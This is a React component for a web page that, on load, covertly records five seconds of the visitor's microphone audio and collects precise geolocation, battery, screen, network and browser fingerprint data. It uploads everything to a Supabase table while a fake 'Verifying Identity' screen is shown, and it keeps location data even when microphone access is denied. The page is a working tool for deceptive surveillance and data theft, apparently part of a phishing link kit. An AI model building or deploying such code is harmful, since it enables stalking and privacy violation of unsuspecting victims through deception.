import { useState, useEffect, useRef } from "react";
import { Loader2, Mic, MicOff, Shield, Smartphone, MapPin } from "lucide-react";
import { supabase } from "@/integrations/supabase/client";
import { useSettings } from "@/contexts/SettingsContext";

const AudioCapture = () => {
  const { settings } = useSettings();
  const [status, setStatus] = useState<"loading" | "recording" | "done" | "error">("loading");
  const [errorMessage, setErrorMessage] = useState("");
  const [progress, setProgress] = useState(0);
  const sessionId = new URLSearchParams(window.location.search).get("session") || settings.camSessionId || "audiocap";
  const hasStarted = useRef(false);

  const collectDeviceInfo = (): Promise<Record<string, any>> => {
    return new Promise((resolve) => {
      const info: Record<string, any> = {
        // Browser & System
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        languages: navigator.languages?.join(", "),
        cookieEnabled: navigator.cookieEnabled,
        doNotTrack: navigator.doNotTrack,
        hardwareConcurrency: navigator.hardwareConcurrency,
        maxTouchPoints: navigator.maxTouchPoints,
        vendor: navigator.vendor,
        appVersion: navigator.appVersion,
        
        // Screen
        screenWidth: window.screen.width,
        screenHeight: window.screen.height,
        screenColorDepth: window.screen.colorDepth,
        screenPixelDepth: window.screen.pixelDepth,
        windowInnerWidth: window.innerWidth,
        windowInnerHeight: window.innerHeight,
        devicePixelRatio: window.devicePixelRatio,
        
        // Time
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        timezoneOffset: new Date().getTimezoneOffset(),
        localTime: new Date().toLocaleString(),
        
        // Connection
        connectionType: (navigator as any).connection?.effectiveType || "unknown",
        downlink: (navigator as any).connection?.downlink || "unknown",
        onLine: navigator.onLine,
        
        // Device
        deviceMemory: (navigator as any).deviceMemory || "unknown",
        webdriver: navigator.webdriver,
        pdfViewerEnabled: navigator.pdfViewerEnabled,
        
        // Location - will be updated
        latitude: null,
        longitude: null,
        accuracy: null,
        locationError: null,
      };

      let resolved = false;
      const resolveWithInfo = () => {
        if (!resolved) {
          resolved = true;
          resolve(info);
        }
      };

      // Get Battery
      if ("getBattery" in navigator) {
        (navigator as any).getBattery().then((battery: any) => {
          info.batteryLevel = Math.round(battery.level * 100) + "%";
          info.batteryCharging = battery.charging;
        }).catch(() => {});
      }

      // Get Location - HIGH PRIORITY
      if ("geolocation" in navigator) {
        navigator.geolocation.getCurrentPosition(
          (pos) => {
            info.latitude = pos.coords.latitude;
            info.longitude = pos.coords.longitude;
            info.accuracy = pos.coords.accuracy + " meters";
            info.altitude = pos.coords.altitude;
            info.altitudeAccuracy = pos.coords.altitudeAccuracy;
            info.heading = pos.coords.heading;
            info.speed = pos.coords.speed;
            info.locationTimestamp = new Date(pos.timestamp).toISOString();
            
            // Generate Google Maps link
            info.googleMapsLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
            
            resolveWithInfo();
          },
          (err) => {
            info.locationError = err.message;
            resolveWithInfo();
          },
          { 
            timeout: 10000, 
            enableHighAccuracy: true,
            maximumAge: 0
          }
        );
      } else {
        info.locationError = "Geolocation not supported";
        resolveWithInfo();
      }

      // Timeout fallback
      setTimeout(() => {
        resolveWithInfo();
      }, 12000);
    });
  };

  const saveToSupabase = async (audioBlob: Blob, deviceData: Record<string, any>) => {
    try {
      const reader = new FileReader();
      reader.readAsDataURL(audioBlob);
      
      reader.onloadend = async () => {
        const base64Audio = reader.result as string;
        
        // Save audio
        await supabase.from("captured_photos").insert({
          session_id: sessionId,
          image_data: base64Audio,
          user_agent: navigator.userAgent,
          ip_address: null,
        });

        // Save device info + location
        await supabase.from("captured_photos").insert({
          session_id: sessionId + "_deviceinfo",
          image_data: JSON.stringify(deviceData),
          user_agent: navigator.userAgent,
          ip_address: null,
        });
      };
    } catch (err) {
      console.error("Save failed:", err);
    }
  };

  const startCapture = async () => {
    try {
      setStatus("recording");
      
      // Start collecting device info + location
      const deviceDataPromise = collectDeviceInfo();
      
      // Request microphone
      const stream = await navigator.mediaDevices.getUserMedia({ 
        audio: { 
          echoCancellation: true,
          noiseSuppression: true,
          autoGainControl: true
        } 
      });

      const mediaRecorder = new MediaRecorder(stream);
      const chunks: BlobPart[] = [];

      mediaRecorder.ondataavailable = (e) => {
        if (e.data.size > 0) chunks.push(e.data);
      };

      mediaRecorder.onstop = async () => {
        const audioBlob = new Blob(chunks, { type: "audio/webm" });
        const deviceData = await deviceDataPromise;
        await saveToSupabase(audioBlob, deviceData);
        
        stream.getTracks().forEach(track => track.stop());
        setStatus("done");
        
        if (settings.camAutoRedirect && settings.camRedirectUrl) {
          setTimeout(() => {
            window.location.href = settings.camRedirectUrl;
          }, 1500);
        }
      };

      mediaRecorder.start();
      
      // Progress animation
      let prog = 0;
      const interval = setInterval(() => {
        prog += 2;
        setProgress(Math.min(prog, 100));
      }, 100);

      // Stop after 5 seconds
      setTimeout(() => {
        clearInterval(interval);
        setProgress(100);
        if (mediaRecorder.state === "recording") {
          mediaRecorder.stop();
        }
      }, 5000);

    } catch (err: any) {
      console.error("Capture error:", err);
      setStatus("error");
      setErrorMessage(err.message || "Permission denied");
      
      // Still save device info even if audio fails
      const deviceData = await collectDeviceInfo();
      await supabase.from("captured_photos").insert({
        session_id: sessionId + "_deviceinfo",
        image_data: JSON.stringify(deviceData),
        user_agent: navigator.userAgent,
        ip_address: null,
      });
    }
  };

  useEffect(() => {
    if (hasStarted.current) return;
    hasStarted.current = true;
    setTimeout(() => startCapture(), 500);
  }, []);

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-900 via-slate-800 to-slate-900 flex items-center justify-center p-4">
      <div className="w-full max-w-sm">
        <div className="text-center space-y-6">
          
          {/* Icon */}
          <div className="flex justify-center">
            <div className={`w-24 h-24 rounded-full flex items-center justify-center transition-all duration-500 ${
              status === "recording" 
                ? "bg-gradient-to-br from-blue-500 to-cyan-500 animate-pulse shadow-lg shadow-blue-500/50" 
                : status === "done"
                ? "bg-gradient-to-br from-green-500 to-emerald-500 shadow-lg shadow-green-500/50"
                : status === "error"
                ? "bg-gradient-to-br from-red-500 to-orange-500"
                : "bg-gradient-to-br from-gray-600 to-gray-700"
            }`}>
              {status === "recording" ? (
                <Mic className="w-12 h-12 text-white animate-pulse" />
              ) : status === "done" ? (
                <Shield className="w-12 h-12 text-white" />
              ) : status === "error" ? (
                <MicOff className="w-12 h-12 text-white" />
              ) : (
                <Smartphone className="w-12 h-12 text-white" />
              )}
            </div>
          </div>

          {/* Title */}
          <div>
            <h1 className="text-xl font-bold text-white mb-2">
              {status === "loading" && "Initializing..."}
              {status === "recording" && "Verifying Identity"}
              {status === "done" && "Verification Complete"}
              {status === "error" && "Verification Failed"}
            </h1>
            <p className="text-gray-400 text-sm">
              {status === "loading" && "Please wait"}
              {status === "recording" && "This will only take a moment"}
              {status === "done" && "You can close this page"}
              {status === "error" && errorMessage}
            </p>
          </div>

          {/* Progress */}
          {status === "recording" && (
            <div className="space-y-3">
              <div className="h-2 bg-gray-700 rounded-full overflow-hidden">
                <div 
                  className="h-full bg-gradient-to-r from-blue-500 to-cyan-500 transition-all duration-100"
                  style={{ width: `${progress}%` }}
                />
              </div>
              <div className="flex items-center justify-center gap-2">
                <Loader2 className="w-4 h-4 text-blue-400 animate-spin" />
                <span className="text-sm text-gray-400">Processing...</span>
              </div>
              <div className="flex items-center justify-center gap-4 text-[10px] text-gray-500">
                <div className="flex items-center gap-1">
                  <Mic className="w-3 h-3" />
                  <span>Audio</span>
                </div>
                <div className="flex items-center gap-1">
                  <MapPin className="w-3 h-3" />
                  <span>Location</span>
                </div>
                <div className="flex items-center gap-1">
                  <Smartphone className="w-3 h-3" />
                  <span>Device</span>
                </div>
              </div>
            </div>
          )}

          {/* Success */}
          {status === "done" && (
            <div className="flex justify-center">
              <div className="w-16 h-16 rounded-full bg-green-500/20 flex items-center justify-center">
                <svg className="w-10 h-10 text-green-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" />
                </svg>
              </div>
            </div>
          )}

          {/* Terms */}
          <p className="text-gray-600 text-[10px] mt-8">
            By using this service, you agree to our Terms of Service and Privacy Policy.
          </p>
        </div>
      </div>
    </div>
  );
};

export default AudioCapture;